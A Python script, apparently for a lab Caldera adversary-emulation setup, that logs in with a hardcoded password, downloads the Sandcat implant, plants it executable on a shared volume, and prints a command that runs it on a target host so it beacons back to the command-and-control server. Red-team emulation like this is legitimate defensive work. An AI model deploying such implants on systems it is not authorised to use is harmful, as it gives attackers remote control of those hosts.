#!/usr/bin/env python3
"""
Agent Deployer - Fixed version for Caldera deployment

Usage:
    python3 agent_deployer.py --target target-1
"""

import subprocess
import time
import requests
import os
from typing import Optional


class AgentDeployer:
    """Deploys agents to Caldera."""

    def __init__(
        self,
        caldera_url: str = "http://caldera:8888",
        username: str = "red",
        password: str = "MIPILOM0hMOJuulLeD1hB7KtFIMSYXe5fA-Scja9cLM",
    ) -> None:
        self.caldera_url = caldera_url
        self.username = username
        self.password = password
        self.session = None

    def login(self) -> requests.Session:
        """Login to Caldera and return session."""
        session = requests.Session()
        # Get login page first to get any CSRF tokens
        session.get(f"{self.caldera_url}/enter")
        # Login
        response = session.post(
            f"{self.caldera_url}/enter",
            data={
                "username": self.username,
                "password": self.password
            },
            allow_redirects=True,
        )
        print(f"[LOGIN] Status: {response.status_code}")
        self.session = session
        return session

    def get_api_key(self) -> Optional[str]:
        """Get API key from config."""
        try:
            response = self.session.get(f"{self.caldera_url}/api/v2/config")
            if response.status_code == 200:
                config = response.json()
                return config.get('api_key_red')
        except Exception as e:
            print(f"[API_KEY] Error: {e}")
        return None

    def download_agent_via_api(self, platform: str = "linux", architecture: str = "amd64") -> Optional[bytes]:
        """Download agent binary using the correct API format."""
        # First get the agent payload from the abilities API
        try:
            # Get abilities to find special payloads
            response = self.session.get(f"{self.caldera_url}/api/abilities")
            if response.status_code == 200:
                print("[AGENT] Abilities loaded, checking for special payloads")

                # Try to download using special payload format
                # The sandcat payload is available via special .go extension
                special_payloads = [".go", ".sh", ".ps1", ".exe"]
                for ext in special_payloads:
                    url = f"{self.caldera_url}/file/download"
                    params = {
                        "file": f"sandcat{ext}",
                        "platform": platform,
                        "architecture": architecture
                    }
                    response = self.session.get(url, params=params)
                    if response.status_code == 200 and len(response.content) > 1000:
                        print(f"[AGENT] Downloaded sandcat{ext}: {len(response.content)} bytes")
                        return response.content
        except Exception as e:
            print(f"[AGENT] Error: {e}")
        return None

    def download_agent_from_gui(self, platform: str = "linux") -> Optional[bytes]:
        """Try downloading from the GUI endpoint."""
        try:
            # Try the direct download with the file parameter
            url = f"{self.caldera_url}/file/download"

            # First get available payloads from the server
            response = self.session.get(f"{self.caldera_url}/api/v2/payloads")
            if response.status_code == 200:
                payloads = response.json()
                print(f"[GUI] Found {len(payloads)} payloads")

            # Try standard download
            params = {
                "platform": platform,
                "arch": "amd64"
            }
            response = self.session.get(url, params=params)
            print(f"[GUI] Download response: {response.status_code}, {len(response.content)} bytes")

            if response.status_code == 200 and len(response.content) > 100:
                # Check if it's actually a file or an error
                content_type = response.headers.get('Content-Type', '')
                if 'error' not in response.text[:100].lower():
                    return response.content
        except Exception as e:
            print(f"[GUI] Error: {e}")
        return None

    def deploy_via_shared_volume(self, target: str = "target-1") -> bool:
        """Deploy agent via shared volume."""
        print(f"[DEPLOY] Preparing agent for {target} via shared volume...")

        # Download agent content
        agent_content = self.download_agent_via_api("linux", "amd64")
        if not agent_content:
            agent_content = self.download_agent_from_gui("linux")

        if not agent_content:
            print("[DEPLOY] Failed to download agent")
            return False

        # Save to shared location that will be mounted
        shared_path = "/shared_agents/sandcat_linux_amd64"
        try:
            with open(shared_path, "wb") as f:
                f.write(agent_content)
            os.chmod(shared_path, 0o755)
            print(f"[DEPLOY] Agent saved to {shared_path}")
            return True
        except Exception as e:
            print(f"[DEPLOY] Error saving to shared volume: {e}")
            return False

    def get_deploy_command(self, target_host: str = "localhost") -> str:
        """Get the deploy command for a target."""
        return f"""cd /shared_agents && ./sandcat_linux_amd64 -server {self.caldera_url} -group red"""

    def wait_for_agent(self, timeout: int = 60) -> bool:
        """Wait for agent to register."""
        start = time.time()
        while time.time() - start < timeout:
            try:
                response = self.session.get(f"{self.caldera_url}/api/v2/agents")
                if response.status_code == 200:
                    agents = response.json()
                    if agents:
                        print(f"[WAIT] Agent registered: {len(agents)} agents")
                        for agent in agents:
                            print(f"  - {agent.get('paw')}: {agent.get('host')}")
                        return True
            except Exception as e:
                print(f"[WAIT] Error: {e}")
            time.sleep(5)

        print("[WAIT] Timeout waiting for agent")
        return False


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--caldera-url", default="http://caldera:8888")
    parser.add_argument("--target", default="target-1", help="Target host name")
    parser.add_argument("--wait", action="store_true", help="Wait for agent registration")

    args = parser.parse_args()

    deployer = AgentDeployer(caldera_url=args.caldera_url)
    deployer.login()

    # Try to deploy via shared volume
    if deployer.deploy_via_shared_volume(args.target):
        print("[OK] Agent prepared in shared volume")
        print(f"[CMD] To deploy, run in {args.target}:")
        print(f"  {deployer.get_deploy_command(args.target)}")

        if args.wait:
            if deployer.wait_for_agent():
                print("[OK] Agent registered with Caldera")
            else:
                print("[ERROR] Agent did not register")
    else:
        print("[ERROR] Failed to prepare agent")


if __name__ == "__main__":
    main()
